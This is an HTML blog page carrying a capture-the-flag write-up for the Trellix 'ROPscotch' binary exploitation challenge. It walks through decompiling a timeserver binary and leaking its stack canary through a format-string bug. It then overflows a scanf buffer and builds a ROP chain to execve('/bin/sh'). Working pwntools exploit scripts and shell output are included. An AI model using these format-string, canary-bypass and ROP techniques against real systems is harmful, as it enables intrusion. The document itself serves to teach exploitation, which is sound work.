@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title>My Blog - 2022-02-Trellix - ROPscotch</title>
+
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="Abraxus">
+    <!-- FontAwesome JS-->
+    <script defer src="../../assets/js/fontawesome.min.js"></script>
+
+    <!-- Theme CSS -->
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/prism.css">
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-90D3KJBRDM"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'G-90D3KJBRDM');
+    </script>
+</head>
+<body class="theme-bg-light">
+
+    <header class="header text-center">
+    <h1 class="blog-name pt-lg-4 mb-0"><a class="no-text-decoration" href="index.html">Abraxus's Blog</a></h1>
+
+    <nav class="navbar navbar-expand-lg navbar-dark">
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div id="navigation" class="collapse navbar-collapse flex-column">
+            <div class="profile-section pt-3 pt-lg-0">
+                <img class="profile-image mb-3 rounded-circle mx-auto" src="../../assets/images/profile.png" alt="image">
+
+                <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
+                <ul class="social-list list-inline py-3 mx-auto">
+                    <li class="list-inline-item"><a href="https://twitter.com/Abraxus7331" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
+                </ul><!--//social-list-->
+                <hr>
+            </div><!--//profile-section-->
+
+            <ul class="navbar-nav flex-column text-center">
+                <li class="nav-item">
+                    <a class="nav-link" href="../../index.html"><i class="fas fa-home fa-fw me-2"></i>Blog Home <i class="fas fa-home fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../about.html"><i class="fas fa-user fa-fw me-2"></i>About Me <i class="fas fa-user fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../blog-posts.html"><i class="fas fa-bookmark fa-fw me-2"></i>Blog Posts <i class="fas fa-bookmark fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../writeups.html"><i class="fas fa-flag fa-fw me-2"></i>Writeups <i class="fas fa-flag fa-fw me-2"></i></a>
+                </li>
+            </ul>
+
+            <div class="my-2 my-md-3 text-center">
+                <a class="btn btn-primary" href="https://github.com/Kasimir123" target="_blank">Get in Touch</a>
+            </div>
+        </div>
+    </nav>
+</header>
+
+    <div class="main-wrapper">
+
+        <article class="markdown-section my-5 mx-5">
+            <h1 id="trellix-ropscotch-write-up">Trellix ROPscotch Write Up</h1>
+<h2 id="details">Details:</h2>
+<p>Jeopardy style CTF</p>
+<p>Category: Binary Exploitation</p>
+<p>Comments:</p>
+<pre><code class="language-text">We just received our latest correspondence from Catmen in the field:
+
+K9's can't coordinate if they can't keep their time and date server secure. We've previously hacked it using a buffer overflow, but they've recently added new security features, including enabling the NX bit and compiling the code with stack canaries. They think they are 100% protected but luckily I have you! Show them what you're made of!
+
+Once you've had a chance to audit the "new and improved" timeserver binary for weaknesses, use it to take control of their server, which you can access at 0.cloud.chals.io:11317. Once you've gained access, retrieve any sensitive information you can find and get out.</code></pre><h2 id="write-up">Write up:</h2>
+<p>Opening the main function of this binary in a decompiler I saw:</p>
+<pre><code class="language-c">0804a3aa      void* const var_4 = __return_addr
+0804a3b1      void* var_10 = &arg_4
+0804a3c0      void* gsbase
+0804a3c0      int32_t eax = *(gsbase + 0x14)
+0804a3da      _IO_setvbuf(stdout, 0, 2, 0)
+0804a3e2      int32_t var_18 = 1
+0804a3e9      get_local_tz()
+0804a40e      for (; var_18 != 0; var_18 = action())
+0804a3fa          _IO_puts("Welcome to the time and date ser…")
+0804a402          int16_t top = top - 1
+0804a402          unimplemented  {call action}
+0804a41f      if ((eax ^ *(gsbase + 0x14)) == 0)
+0804a42f          return 0
+0804a421      __stack_chk_fail()
+0804a421      noreturn</code></pre>
+<p>I saw that there wasn't too much interesting content in this function so I decided to take a look at the action function. After cleaning up the function a bit, resolving a missing parameter for scanf and renaming the variables I ended up with the following:</p>
+<pre><code class="language-c">0804a28b  int80_t action()
+
+0804a2a4      void* gsbase
+0804a2a4      int32_t canary = *(gsbase + 0x14)
+0804a2c0      void user_input
+0804a2c0      int80_t num_items_read = __isoc99_scanf("%s", user_input: &user_input)
+0804a2e3      if (sub_80490e0(&user_input, "T") == 0)
+0804a2ea          print_time(1)
+0804a312      else if (sub_80490e0(&user_input, "D") == 0)
+0804a319          print_time(2)
+0804a33e      else if (sub_80490e0(&user_input, "L") != 0)
+0804a356          _IO_printf("Invalid option: ")
+0804a368          _IO_printf(&user_input)
+0804a375          putchar(0xa)
+0804a340      else
+0804a340          get_location()
+0804a393      if ((canary ^ *(gsbase + 0x14)) == 0)
+0804a39e          return num_items_read
+0804a395      __stack_chk_fail()
+0804a395      noreturn</code></pre>
+<p>This function is protected using a stack canary which is saved at the start of the function and checked at the end of the function to make sure that we do not overflow anything. The function then reads in our input and if we type T it calls the print_time functin with a value of 1, if we use D we call the function with a value of 2. If our input is equal to L we call a function called get_location, otherwise we print out the user input.</p>
+<p>My first step here was to see if there really was a stack canary so I tried to just overflow the value:</p>
+<pre><code class="language-text">Welcome to the time and date server!
+Please select from the following options.
+	T = Show current time.
+	D = Show current date.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Invalid option: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+*** stack smashing detected ***: terminated
+Aborted (core dumped)</code></pre>
+<p>This ended up being the case, but I was also able to confirm that I was able to get an overflow so now I was able to formulate my exploitation plan. Since the main function loops through the action function numerous times, our first step is to print out the value of the canary, then we will overflow, rewrite the canary value with the correct value, and then we are going to use a rop chain in order to call execve(&quot;/bin/sh&quot;).</p>
+<p>Looking at the disassembly we can see that the canary value is read into eax:</p>
+<pre><code class="language-text">0804a2a4  mov     eax, dword [gs:0x14]</code></pre>
+<p>I then opened the program up in GDB and set a breakpoint at the instruction after the one above:</p>
+<pre><code class="language-text">b *0x804a2aa</code></pre>
+<p>I then ran the program and wrote down the value of eax at this point, I then set a second breakpoint at the address right before we would call the printf <code>0804a368</code> so I could see the stack at that moment to see where on the stack the canary was. To see the stack I ran <code>x/40 $sp</code>:</p>
+<p><img src="https://raw.githubusercontent.com/Kasimir123/CTFWriteUps/main/2022-02-Trellix/ROPscotch/Photos/eax.png" alt="eax" /></p>
+<p>Where eax is the canary value</p>
+<p><img src="https://raw.githubusercontent.com/Kasimir123/CTFWriteUps/main/2022-02-Trellix/ROPscotch/Photos/stack.png" alt="stack" /></p>
+<p>As you can see in the above, we can see the canary on the stack right at the printf call. Now that we think we know where the canary is lets confirm it by trying to print that value off of the stack. To do this I set the breakpoint again to see what the canary was and then passed in <code>%39$x</code> as our input since 39 is the position on the stack that our canary is when the print is called.</p>
+<p>Now that we can read the canary, we need to know how much we have to overflow our input in order to overwrite the canary. Luckily binja has a stack view that makes it very easy to see:</p>
+<p><img src="https://raw.githubusercontent.com/Kasimir123/CTFWriteUps/main/2022-02-Trellix/ROPscotch/Photos/stack_view.png" alt="stack" /></p>
+<p>From this we can see that in order to overflow into our canary we will need to write 0x80 (0x90 - 0x10) bytes. So lets try writing that many bytes, then writing our canary value, and then lets fill the return address with trash to see if we can get a segfault:</p>
+<pre><code class="language-python"># import pwntools
+from pwn import *
+
+# open process
+s = process('./timeserver')
+
+# print the text
+print(s.recvuntil(b'date.\n'))
+
+# send input for canary
+s.sendline(b'%39$p')
+
+# parse the canary
+canary = p32(int(s.recvline().split(b': 0x')[1][:-1], 16))
+
+# print the text
+print(s.recvuntil(b'date.\n'))
+
+# send payload with canary
+s.sendline((b'a' * 128) + canary + (b'A' * 100))
+
+# print the rest
+print(s.recvline())
+print(s.recvline())
+print(s.recvline())</code></pre>
+<p>When we run the script we get a segfault without the warning about stack smashing:</p>
+<pre><code class="language-text">[+] Starting local process './timeserver': pid 5037
+b'Welcome to the time and date server!\nPlease select from the following options.\n\tT = Show current time.\n\tD = Show current date.\n'
+b'Welcome to the time and date server!\nPlease select from the following options.\n\tT = Show current time.\n\tD = Show current date.\n'
+b'Invalid option: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
+Traceback (most recent call last):
+...
+EOFError
+[*] Process './timeserver' stopped with exit code -11 (SIGSEGV) (pid 5037)</code></pre>
+<p>Now that we are able to overwrite the return address it is time for our rop chain. We are going to make a chain of gadgets in order to call <code>execve(&quot;/bin/sh&quot;)</code>. In order to do this we need to set ecx to 0, ebx to the address in memory for the string /bin/sh, and set eax to 11 as that is the system call for execve. Once all of the registers are set to these values we can call int 0x80 to perform the function call.</p>
+<p>I used a combination of ropper and binja in order to find the gadgets but the gadgets I ended up using were:</p>
+<pre><code class="language-text">08066218  58                 pop     eax {var_c}
+08066219  5a                 pop     edx {var_8}
+0806621a  5b                 pop     ebx {__saved_ebx}  {_GLOBAL_OFFSET_TABLE_}
+0806621b  c3                 retn     {__return_addr}</code></pre>
+<p>I used this gadget in order to set eax, edx, and ebx to values on the stack which I had full control over.</p>
+<pre><code class="language-text">08067de4  8990ac180000       mov     dword [eax+0x18ac], edx  {perturb_byte}
+08067dea  c3                 retn     {__return_addr}</code></pre>
+<p>I used this gadget in order to move whatever was in edx to a memory region defined by eax + 0x18ac.</p>
+<pre><code class="language-text">08073700  f30f6f48c3         movdqu  xmm1, xmmword [eax-0x3d]</code></pre>
+<p>The last two opcodes of this gadget were 48 and c3 which by themselves equalled dec eax and then ret, I used these to decrement the value stored in eax.</p>
+<pre><code class="language-text">0804ad4f  31c9               xor     ecx, ecx  {0x0}
+0804ad51  cd80               int     0x80</code></pre>
+<p>And finally, I used this gadget in order to clear out ecx and then perform the system call.</p>
+<p><img src="https://raw.githubusercontent.com/Kasimir123/CTFWriteUps/main/2022-02-Trellix/ROPscotch/Photos/sections.png" alt="Sections" /></p>
+<p>After looking through the sections of the file I decided to use the bss section since we had write access to it and it was fairly large. In the end my rop chain moved /bin/sh into the memory region and saved the address where we stored the string into ebx. The chain then moved 0x21 into eax and decremented eax 22 times since we could not simply put 11 into eax as it was an illegal character. And finally, we performed the syscall. The script for this ended up being:</p>
+<pre><code class="language-python"># import pwntools
+from pwn import *
+
+# open the remote connection
+s = remote('0.cloud.chals.io', 11317)
+
+# print the text
+print(s.recvuntil(b'date.\n'))
+
+# send input for canary
+s.sendline(b'%39$p')
+
+# parse the canary
+canary = p32(int(s.recvline().split(b': 0x')[1][:-1], 16))
+
+# print the text
+print(s.recvuntil(b'date.\n'))
+
+# intialize the string
+rop = b''
+
+# load /bin into edx and set eax to the memory we want
+rop += p32(0x8066218)
+rop += p32(0x08111321 - 0x18ac) # eax
+rop += b'/bin' # edx
+rop += p32(0x0) #ebx
+
+# set the memory region with the above
+rop += p32(0x8067de4)
+
+# load /sh\x00 into edx and set eax to the memory we want
+rop += p32(0x8066218)
+rop += p32(0x08111321 + 4 - 0x18ac) # eax
+rop += b'/sh\x00' # edx
+rop += p32(0x0) #ebx
+
+# set the memory region with the above
+rop += p32(0x8067de4)
+
+# set eax to 0x21, edx to null, and ebx to the address we stored the string
+rop += p32(0x8066218)
+rop += p32(0x21) # eax
+rop += p32(0x0) # edx
+rop += p32(0x08111321) #ebx
+
+# dec eax 22 times
+rop += p32(0x8073703) * 22
+
+# system call
+rop += p32(0x804ad4f)
+
+# send payload with canary
+s.sendline((b'a' * 128) + canary + (b'a' * 12) + rop)
+
+# spawn the shell
+s.interactive()</code></pre>
+<p>And when run we got:</p>
+<pre><code class="language-text">[+] Opening connection to 0.cloud.chals.io on port 11317: Done
+b'Welcome to the time and date server!\nPlease select from the following options.\n\tT = Show current time.\n\tD = Show current date.\n'
+b'Welcome to the time and date server!\nPlease select from the following options.\n\tT = Show current time.\n\tD = Show current date.\n'
+[*] Switching to interactive mode
+Invalid option: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+$ ls
+bin
+boot
+dev
+entrypoint.sh
+etc
+flag.txt
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+private
+proc
+root
+run
+sbin
+srv
+sys
+timeserver
+tmp
+usr
+var
+$ cat flag.txt
+ATR[84DC0D31584DC0D3]
+$ 
+[*] Interrupted
+[*] Closed connection to 0.cloud.chals.io port 11317</code></pre>
+        </article>
+
+        <footer class="footer text-left py-2 theme-bg-dark">
+
+    <small class="copyright">&nbsp;Generated by <a href="https://github.com/Kasimir123/Blog-Generator" target="_blank">Blog Generator</a> from Kasimir123</small>
+
+</footer>
+
+    </div><!--//main-wrapper-->
+    <!-- Javascript -->
+    <script src="../../assets/js/popper.min.js"></script>
+    <script src="../../assets/js/bootstrap.min.js"></script>
+    <script src="../../assets/js/prism.js"></script>
+</body>
+</html>
